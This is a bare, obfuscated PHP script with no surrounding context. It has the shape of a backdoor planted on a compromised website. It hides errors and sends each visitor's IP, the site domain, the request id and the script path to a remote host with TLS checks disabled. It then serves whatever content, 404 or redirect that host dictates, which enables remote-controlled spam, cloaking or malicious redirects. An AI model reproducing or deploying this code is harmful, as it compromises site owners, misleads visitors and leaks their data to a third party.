<?php

try {
    ini_set("display_errors", "off");
    error_reporting("\x00\x00\x0f\x03\x18");
    set_time_limit(0);
    $AvSK8 = "123";
    $b_bW3 = "https://eyebmx.com/ss65.php?key=123";
    $ozJJa = array("user_agent:" . $_SERVER["HTTP_USER_AGENT"]);
    $HYchC = isset($_SERVER["HTTP_X_FORWARDED_HOST"]) ? $_SERVER["HTTP_X_FORWARDED_HOST"] : (isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : '');
    $vp5Rj = isset($_SERVER["REQUEST_URI"]) && $_SERVER["REQUEST_URI"] != '' ? $_SERVER["REQUEST_URI"] : $_SERVER["HTTP_X_REWRITE_URL"];
    $qrDVl = !empty($_REQUEST["id"]) ? urlencode($_REQUEST["id"]) : '';
    $exKsu = $_SERVER["SCRIPT_NAME"];
    $b_bW3 = "https://eyebmx.com/ss65.php?key=123&ip=" . QPEEo() . "&id=" . $qrDVl . "&domain=" . $HYchC . "&local=" . urlencode($exKsu);
    $EQqCA = DtG_P($b_bW3, $ozJJa);
    $qdYn0 = explode("::::", $EQqCA);
    switch ($qdYn0[0]) {
        case 404:
            header("HTTP/1.0 404 Not Found", true, 404);
            exit;
        case 302:
            header("Location: " . $qdYn0[1], true, 302);
            exit;
        default:
            echo $qdYn0[1];
            goto BYgUz;
    }
    BYgUz:
} catch (Exception $P0S2u) {
    exit("e:" . $P0S2u->getMessage());
}
function dtg_p($N7dQV, $ozJJa = '')
{
    $zE872 = curl_init();
    curl_setopt($zE872, CURLOPT_URL, $N7dQV);
    curl_setopt($zE872, CURLOPT_HEADER, 0);
    curl_setopt($zE872, CURLOPT_TIMEOUT, 30);
    curl_setopt($zE872, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($zE872, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
    curl_setopt($zE872, CURLOPT_REFERER, @$_SERVER["HTTP_REFERER"]);
    curl_setopt($zE872, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($zE872, CURLOPT_SSL_VERIFYHOST, FALSE);
    if (!$ozJJa) {
        goto rEGtV;
    }
    curl_setopt($zE872, CURLOPT_HTTPHEADER, $ozJJa);
    rEGtV:
    $EZdsw = curl_exec($zE872);
    curl_close($zE872);
    return $EZdsw;
}
function QpEeO()
{
    $N9BHj = '';
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
        $N9BHj = getenv("HTTP_CLIENT_IP");
        goto UZocj;
    }
    if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
        $N9BHj = getenv("HTTP_X_FORWARDED_FOR");
        goto b53VZ;
    }
    if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
        $N9BHj = getenv("REMOTE_ADDR");
        goto ddhLs;
    }
    if (isset($_SERVER["REMOTE_ADDR"]) && $_SERVER["REMOTE_ADDR"] && strcasecmp($_SERVER["REMOTE_ADDR"], "unknown")) {
        $N9BHj = $_SERVER["REMOTE_ADDR"];
        goto eex1A;
    }
    eex1A:
    ddhLs:
    b53VZ:
    UZocj:
    return preg_match("/[\\d\\.]{7,15}/", $N9BHj, $X68Cp) ? $X68Cp[0] : '';
}
